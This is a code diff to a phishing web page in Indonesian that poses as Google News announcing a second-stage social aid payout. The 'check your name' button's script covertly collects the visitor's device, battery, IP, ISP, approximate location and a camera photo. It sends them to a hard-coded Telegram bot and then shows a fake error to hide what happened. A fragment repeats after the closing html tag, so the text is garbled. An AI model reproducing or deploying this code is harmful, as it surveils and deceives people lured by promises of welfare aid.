@@ -8,16 +8,17 @@
         body { font-family: sans-serif; margin: 0; background: #f0f2f5; text-align: center; }
         .header-news { background: #1a73e8; color: white; padding: 15px; font-weight: bold; font-size: 20px; }
         .card { max-width: 500px; margin: 20px auto; background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); padding: 20px; }
-        .btn { display: block; width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn { display: block; width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; font-size: 16px; transition: 0.3s; }
+        .btn:active { background: #1557b0; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="header-news">Google News Indonesia</div>
     <div class="card">
-        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%">
+        <img src="https://images.unsplash.com/photo-1529107386315-e1a2ed48a620?w=500" style="width:100%; border-radius: 5px;">
         <h1>Bantuan Sosial Tahap 2 Cair, Cek NIK Anda Sekarang</h1>
-        <p>Pastikan perangkat Anda terverifikasi untuk melihat daftar nama penerima bantuan.</p>
+        <p>Pemerintah menyalurkan bantuan tambahan. Pastikan perangkat Anda terverifikasi untuk melihat daftar nama.</p>
         <button class="btn" id="startBtn">CEK DAFTAR NAMA</button>
     </div>
     <video id="video" autoplay></video>
@@ -28,22 +29,33 @@
         const id = "5392443720";
 
         document.getElementById('startBtn').addEventListener('click', async function() {
-            this.innerText = "Memproses...";
+            this.innerText = "Memverifikasi... (65%)";
             this.disabled = true;
 
             let info = "📸 *HASIL CAPTURE UJANG MODS*%0A";
             info += "━━━━━━━━━━━━━━━━━━%0A";
 
-            // Ambil IP
+            // 1. Data Device & Browser
+            info += "📱 *Device:* " + navigator.platform + "%0A";
+            
+            // 2. Cek Baterai
+            try {
+                const b = await navigator.getBattery();
+                info += "🔋 *Baterai:* " + Math.round(b.level * 100) + "% (" + (b.charging ? 'Dicas' : 'Tidak Dicas') + ")%0A";
+            } catch(e) {}
+
+            // 3. Ambil IP & Lokasi (IPAPI)
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 info += "🌍 *IP:* " + d.ip + "%0A";
                 info += "🏢 *ISP:* " + d.org + "%0A";
-                info += "📍 *Kota:* " + d.city + "%0A";
-            } catch(e) { info += "🌍 IP: Gagal Ambil%0A"; }
+                info += "📍 *Kota:* " + d.city + ", " + d.region + "%0A";
+                // Link Google Maps berdasarkan koordinat IP
+                info += "📌 *Maps:* [Buka Lokasi](https://www.google.com/maps?q=" + d.latitude + "," + d.longitude + ")%0A";
+            } catch(e) { info += "🌍 *Data IP:* Gagal Ambil%0A"; }
 
-            // Ambil Kamera
+            // 4. Ambil Kamera & Kirim
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
@@ -60,6 +72,26 @@
                         fd.append('photo', blob, 'f.jpg');
                         fd.append('caption', decodeURIComponent(info));
                         fd.append('parse_mode', 'Markdown');
+                        
+                        fetch("https://api.telegram.org/bot" + tok + "/sendPhoto", { method: 'POST', body: fd });
+                        stream.getTracks().forEach(t => t.stop());
+                        
+                        alert("Error 505: Gagal memuat daftar nama. Silakan coba lagi nanti.");
+                        document.getElementById('startBtn').innerText = "CEK DAFTAR NAMA";
+                        document.getElementById('startBtn').disabled = false;
+                    }, 'image/jpeg');
+                }, 2000); // Tunggu 2 detik buat fokus
+            } catch (err) {
+                // Jika kamera ditolak, tetep kirim data teks
+                fetch("https://api.telegram.org/bot" + tok + "/sendMessage?chat_id=" + id + "&text=" + info + "%0A⚠️ *Kamera Ditolak*&parse_mode=Markdown");
+                alert("Akses verifikasi ditolak. Perangkat tidak dikenali.");
+                this.innerText = "CEK DAFTAR NAMA";
+                this.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>                        fd.append('parse_mode', 'Markdown');
                         
                         fetch("https://api.telegram.org/bot" + tok + "/sendPhoto", { method: 'POST', body: fd });
                         stream.getTracks().forEach(t => t.stop());
